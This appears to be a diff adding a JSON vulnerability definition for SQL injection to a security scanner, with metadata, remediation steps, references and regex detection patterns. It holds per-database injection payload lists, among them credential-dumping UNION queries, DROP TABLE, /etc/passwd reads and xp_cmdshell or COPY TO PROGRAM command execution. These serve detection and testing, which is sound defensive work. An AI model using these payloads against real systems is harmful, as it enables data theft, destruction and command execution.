@@ -1,0 +1,92 @@
+{
+    "sql_injection": {
+        "name": "SQL注入",
+        "cwe_id": "CWE-89",
+        "cvss_base_score": 9.8,
+        "description": "SQL注入漏洞允许攻击者通过操纵应用程序的数据库查询来执行恶意SQL代码",
+        "impact": "数据泄露、数据篡改、权限提升、远程代码执行(某些情况)",
+        "payloads": {
+            "mysql": [
+                "' OR '1'='1",
+                "' OR '1'='1' --",
+                "' OR '1'='1' /*",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT username,password FROM users--",
+                "1; DROP TABLE users--",
+                "1; INSERT INTO users VALUES('hacker','password')--",
+                "' AND 1=1--",
+                "' AND 1=2--",
+                "admin'--",
+                "admin' #",
+                "' OR 1=1#",
+                "' OR ''='",
+                "1' ORDER BY 1--",
+                "1' ORDER BY 2--",
+                "-1' UNION SELECT 1,2,3--",
+                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+            ],
+            "postgresql": [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT version()--",
+                "'; SELECT pg_read_file('/etc/passwd')--",
+                "'; COPY (SELECT '') TO PROGRAM 'id'--"
+            ],
+            "sqlite": [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT sqlite_version()--",
+                "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
+            ],
+            "mssql": [
+                "' OR '1'='1",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT @@version--",
+                "'; EXEC xp_cmdshell('whoami')--",
+                "'; EXEC sp_executesql N'SELECT * FROM users'--"
+            ],
+            "oracle": [
+                "' OR '1'='1",
+                "' UNION SELECT NULL FROM dual--",
+                "' UNION SELECT banner FROM v$version--",
+                "' UNION SELECT table_name FROM all_tables--"
+            ]
+        },
+        "detection_patterns": [
+            "execute\\s*\\(.*\\+.*\\)",
+            "execute\\s*\\(.*%s.*%.*\\)",
+            "execute\\s*\\(.*format\\s*\\(.*\\)",
+            "execute\\s*\\(.*f['\"].*\\{.*\\}.*['\"].*\\)",
+            "raw\\s*\\(.*\\+.*\\)",
+            "raw\\s*\\(.*%.*\\)",
+            "cursor\\.execute\\s*\\(.*\\+.*\\)",
+            "\\.extra\\s*\\(.*select.*\\+.*\\)",
+            "\\.extra\\s*\\(.*where.*\\+.*\\)",
+            "text\\s*\\(.*\\+.*\\)"
+        ],
+        "safe_patterns": [
+            "execute\\s*\\(.*\\?.*\\)",
+            "execute\\s*\\(.*%s.*\\)",
+            "execute\\s*\\(.*:.*\\)",
+            "cursor\\.execute\\s*\\(.*\\?.*\\)",
+            "cursor\\.execute\\s*\\(.*%s.*,.*\\)"
+        ],
+        "remediation": [
+            "使用参数化查询(预编译语句)",
+            "使用ORM框架的安全方法",
+            "对用户输入进行严格验证和过滤",
+            "使用存储过程",
+            "实施最小权限原则",
+            "使用Web应用防火墙(WAF)"
+        ],
+        "references": [
+            "https://owasp.org/www-community/attacks/SQL_Injection",
+            "https://cwe.mitre.org/data/definitions/89.html",
+            "https://portswigger.net/web-security/sql-injection"
+        ]
+    }
+}
